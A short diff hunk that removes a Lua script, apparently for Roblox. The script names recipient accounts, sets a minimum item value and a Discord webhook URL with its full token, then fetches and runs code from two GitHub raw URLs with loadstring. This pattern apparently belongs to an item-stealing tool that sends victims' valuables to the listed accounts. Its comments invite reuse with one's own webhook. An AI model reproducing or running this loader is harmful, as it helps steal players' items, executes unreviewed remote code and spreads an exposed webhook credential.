@@ -1,6 +1,0 @@
-_G.Usernames = {"Fazy123444", "FadySNA","Andrewdagoatya","Idowin939"} -- you can add as many as you'd like
-_G.min_rap = 50
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1444816668663746621/w-DvyZXVkft8eonnJ5IT9a0jKkU58r1oXIUIUPEk6h671bwrSUuYWMzf5kaI9O8xkeQA" -- change to your webhook
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/Main/refs/heads/main/source.txt"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
